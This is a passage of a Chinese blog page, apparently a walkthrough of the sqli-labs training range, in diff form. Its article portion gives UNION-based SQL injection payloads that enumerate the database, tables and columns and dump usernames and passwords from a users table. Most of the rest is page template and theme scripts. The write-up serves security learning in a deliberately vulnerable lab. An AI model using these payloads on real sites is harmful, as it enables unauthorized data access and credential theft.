+<p>这里<code>id</code>等于<code>-1</code>在 Less 1 中解释过，使原查询左边为空，使我们定义的查询结果返回。</p>
+<p><strong>注意：</strong>这里的<code>or &#39;1&#39;=&#39;1&#39;</code>是作为<code>column_3</code>的操作符，因其为永真条件，在<code>column_3</code>回显处会显示<code>1</code>，所以不能在<code>column_3</code>处注入。</p>
+<p><code>?id=-1&#39; union select 2,3,4 or &#39;1&#39;=&#39;1</code></p>
+<p>回显如下</p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiZu80.png" alt="AiZu80.png"></p>
+<p>所以唯一的回显字段便是<code>username</code>即<code>column_2</code>，这也是唯一的注入点。</p>
+<h4 id="注入-3"><a href="#注入-3" class="headerlink" title="注入"></a>注入</h4><p><strong>爆库</strong></p>
+<p><code>?id=-1&#39; union select 1,database(),3 or &#39;1&#39;=&#39;1</code></p>
+<p><img src="https://s2.ax1x.com/2019/03/12/AiZU8x.png" alt="AiZU8x.png"></p>
+<p><strong>爆表</strong></p>
+<p><code>?id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),3 or &#39;1&#39;=&#39;1</code></p>
+<p><strong>爆列</strong></p>
+<p><code>?id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),3 or &#39;1&#39;=&#39;1</code></p>
+<p><strong>爆内容</strong></p>
+<p><code>?id=-1&#39; union select 1,(select group_concat(concat_ws(&#39;-&#39;,id,username,password)) from users),3 or &#39;1&#39;=&#39;1</code></p>
+  
+	</div>
+		<footer class="article-footer clearfix">
+<div class="article-catetags">
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/SQL/">SQL</a>
+</div>
+
+
+  <div class="article-tags">
+  
+  <span></span> <a href="/tags/ctf/">ctf</a><a href="/tags/SQL/">SQL</a>
+  </div>
+
+</div>
+
+
+
+	<div class="article-share" id="share">
+	
+	  <div data-url="http://example.com/2019/01/29/%E9%9D%B6%E5%9C%BA/sqli-labs%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/" data-title="sqli-labs靶场练习 | Hexo" data-tsina="" class="share clearfix">
+	  </div>
+	
+	</div>
+
+
+</footer>
+
+   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2019/03/01/编程/Linux配置本地yum源/" title="Linux配置本地yum源">
+  <strong>上一篇：</strong><br/>
+  <span>
+  Linux配置本地yum源</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/01/24/大学CTF/CUMT双月赛二/"  title="CUMMT双月赛二">
+ <strong>下一篇：</strong><br/> 
+ <span>CUMMT双月赛二
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+
+
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+ 
+ <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E5%82%A8%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">知识储备</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#information-schema"><span class="toc-number">2.1.</span> <span class="toc-text">information_schema</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%BA%9B%E7%BB%8F%E5%B8%B8%E7%94%A8%E5%88%B0%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">这是一些经常用到的函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-to-Less10"><span class="toc-number"></span> <span class="toc-text">Less-1 to Less10</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-1"><span class="toc-number">1.</span> <span class="toc-text">Less-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-2"><span class="toc-number">2.</span> <span class="toc-text">Less-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-3"><span class="toc-number">3.</span> <span class="toc-text">Less-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-4"><span class="toc-number">4.</span> <span class="toc-text">Less-4</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-5"><span class="toc-number">5.</span> <span class="toc-text">Less-5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-6"><span class="toc-number">6.</span> <span class="toc-text">Less-6</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-7"><span class="toc-number">7.</span> <span class="toc-text">Less-7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-8"><span class="toc-number">8.</span> <span class="toc-text">Less-8</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-9"><span class="toc-number">9.</span> <span class="toc-text">Less-9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-10"><span class="toc-number">10.</span> <span class="toc-text">Less-10</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-11-to-Less-20"><span class="toc-number"></span> <span class="toc-text">Less-11 to Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-11"><span class="toc-number">1.</span> <span class="toc-text">Less-11</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-12"><span class="toc-number">2.</span> <span class="toc-text">Less-12</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-13"><span class="toc-number">3.</span> <span class="toc-text">Less-13</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-14"><span class="toc-number">4.</span> <span class="toc-text">Less-14</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-15"><span class="toc-number">5.</span> <span class="toc-text">Less-15</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-16"><span class="toc-number">6.</span> <span class="toc-text">Less-16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E6%96%B9%E5%BC%8F%E4%B8%8E%E5%9B%9E%E6%98%BE%E5%AF%B9%E6%AF%94"><span class="toc-number">6.1.</span> <span class="toc-text">注入方式与回显对比</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5"><span class="toc-number">6.2.</span> <span class="toc-text">分析查询语句</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-17"><span class="toc-number">7.</span> <span class="toc-text">Less-17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B4%BE%E7%94%9F%E8%A1%A8%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">7.1.</span> <span class="toc-text">派生表注入过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml-%E6%B3%A8%E5%85%A5"><span class="toc-number">7.2.</span> <span class="toc-text">updatexml()注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B"><span class="toc-number">7.2.1.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-18"><span class="toc-number">8.</span> <span class="toc-text">Less-18</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">8.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">8.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-19"><span class="toc-number">9.</span> <span class="toc-text">Less-19</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">9.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-1"><span class="toc-number">9.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-20"><span class="toc-number">10.</span> <span class="toc-text">Less-20</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">10.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E8%BF%87%E7%A8%8B-1"><span class="toc-number">10.2.</span> <span class="toc-text">注入过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-21-to-Less30"><span class="toc-number"></span> <span class="toc-text">Less-21 to Less30</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-21"><span class="toc-number">1.</span> <span class="toc-text">Less-21</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-3"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-2"><span class="toc-number">1.2.</span> <span class="toc-text">注入</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-22"><span class="toc-number">2.</span> <span class="toc-text">Less-22</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-23"><span class="toc-number">3.</span> <span class="toc-text">Less-23</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90-4"><span class="toc-number">3.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5-3"><span class="toc-number">3.2.</span> <span class="toc-text">注入</span></a></li></ol></li></ol>
+ 
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+		  
+			<li><a href="/categories/CTF/" title="CTF">CTF<sup>10</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Linux/" title="Linux">Linux<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Other/" title="Other">Other<sup>24</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/Sec/" title="Sec">Sec<sup>1</sup></a></li>
+		  
+		
+		  
+			<li><a href="/categories/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+		  
+		
+		</ul>
+</div>
+
+
+  
+<div class="tagslist">
+	<p class="asidetitle">Tags</p>
+		<ul class="clearfix">
+		
+			
+				<li><a href="/tags/ctf/" title="ctf">ctf<sup>21</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/buuctf/" title="buuctf">buuctf<sup>6</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Java/" title="Java">Java<sup>5</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQLi/" title="SQLi">SQLi<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SQL/" title="SQL">SQL<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/Linux/" title="Linux">Linux<sup>3</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/PHP绕过/" title="PHP绕过">PHP绕过<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MYSQL比较特性/" title="MYSQL比较特性">MYSQL比较特性<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/SSRF/" title="SSRF">SSRF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/java-WEB-INF/" title="java-WEB-INF">java-WEB-INF<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/无参数RCE/" title="无参数RCE">无参数RCE<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/模板注入/" title="模板注入">模板注入<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/MISC/" title="MISC">MISC<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/IoT/" title="IoT">IoT<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/wifi密码破解/" title="wifi密码破解">wifi密码破解<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/安恒11月月赛/" title="安恒11月月赛">安恒11月月赛<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt/" title="cumt">cumt<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/cumt双月赛一/" title="cumt双月赛一">cumt双月赛一<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/php变量覆盖/" title="php变量覆盖">php变量覆盖<sup>1</sup></a></li>
+			
+		
+			
+				<li><a href="/tags/代码审计/" title="代码审计">代码审计<sup>1</sup></a></li>
+			
+		
+		</ul>
+</div>
+
+
+  <div class="linkslist">
+  <p class="asidetitle">Links</p>
+    <ul>
+        
+          <li>
+            
+            	<a href="https://coderq.com" target="_blank" title="一个面向程序员交流分享的新一代社区">码农圈</a>
+            
+          </li>
+        
+          <li>
+            
+            	<a href="http://wuchong.me" target="_blank" title="Jark&#39;s Blog">Jark&#39;s Blog</a>
+            
+          </li>
+        
+    </ul>
+</div>
+
+  
+
+
+  <div class="rsspart">
+	<a href="/atom.xml" target="_blank" title="rss">RSS</a>
+</div>
+
+  <div class="weiboshow">
+  <p class="asidetitle">Weibo</p>
+    <iframe width="100%" height="119" class="share_self"  frameborder="0" scrolling="no" src="http://widget.weibo.com/weiboshow/index.php?language=&width=0&height=119&fansRow=2&ptype=1&speed=0&skin=9&isTitle=1&noborder=1&isWeibo=0&isFans=0&uid=&verifier=&dpc=1"></iframe>
+</div>
+
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Good Good Study！ <br/>
+			Day Day Up！</p>
+	</section>
+	 
+	<div class="social-font" class="clearfix">
+		
+		
+		
+		
+		
+		
+		
+		
+		
+		
+	</div>
+			
+		
+
+		<p class="copyright">
+		Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/wuchong/jacman" target="_blank" title="Jacman">Jacman</a> © 2021 
+		
+		<a href="/about" target="_blank" title="John Doe">John Doe</a>
+		
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/jquery.qrcode-0.12.0.min.js"></script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+  
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else{
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  c.click(function(){
+    ta.css('display', 'block').addClass('fadeIn');
+  });
+  o.click(function(){
+    ta.css('display', 'none');
+  });
+  $(window).scroll(function(){
+    ta.css("top",Math.max(140,320-$(this).scrollTop()));
+  });
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina'),
+      description = $this.attr('description');
+  var html = [
+  '<div class="hoverqrcode clearfix"></div>',
+  '<a class="overlay" id="qrcode"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="微信"></a>',
+  '<a href="http://widget.renren.com/dialog/share?resourceUrl=' + encodedUrl + '&srcUrl=' + encodedUrl + '&title=' + title +'" class="article-share-renren" target="_blank" title="人人"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="微博"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+
+  $('.hoverqrcode').hide();
+
+  var myWidth = 0;
+  function updatehoverqrcode(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+    var qrsize = myWidth > 1024 ? 200:100;
+    var options = {render: 'image', size: qrsize, fill: '#2ca6cb', text: url, radius: 0.5, quiet: 1};
+    var p = $('.article-share-qrcode').position();
+    $('.hoverqrcode').empty().css('width', qrsize).css('height', qrsize)
+                          .css('left', p.left-qrsize/2+20).css('top', p.top-qrsize-10)
+                          .qrcode(options);
+  };
+  $(window).resize(function(){
+    $('.hoverqrcode').hide();
+  });
+  $('.article-share-qrcode').click(function(){
+    updatehoverqrcode();
+    $('.hoverqrcode').toggle();
+  });
+  $('.article-share-qrcode').hover(function(){}, function(){
+      $('.hoverqrcode').hide();
+  });
+});   
+</script>
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.article-content').each(function(i){
+    $(this).find('img').each(function(){
+      if ($(this).parent().hasClass('fancybox')) return;
+      var alt = this.alt;
+      if (alt) $(this).after('<span class="caption">' + alt + '</span>');
+      $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox"></a>');
+    });
+    $(this).find('.fancybox').each(function(){
+      $(this).attr('rel', 'article' + i);
+    });
+  });
+  if($.fancybox){
+    $('.fancybox').fancybox();
+  }
+}); 
+</script>
+
+
+
+<!-- Analytics Begin -->
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Analytics End -->
+
+<!-- Totop Begin -->
+
+	<div id="totop">
+	<a title="Back to Top"><img src="/img/scrollup.png"/></a>
+	</div>
+	<script src="/js/totop.js"></script>
+
+<!-- Totop End -->
+
+<!-- MathJax Begin -->
+<!-- mathjax config similar to math.stackexchange -->
+
+
+<!-- MathJax End -->
+
+<!-- Tiny_search Begin -->
+
+<!-- Tiny_search End -->
+
+  </body>
+</html>
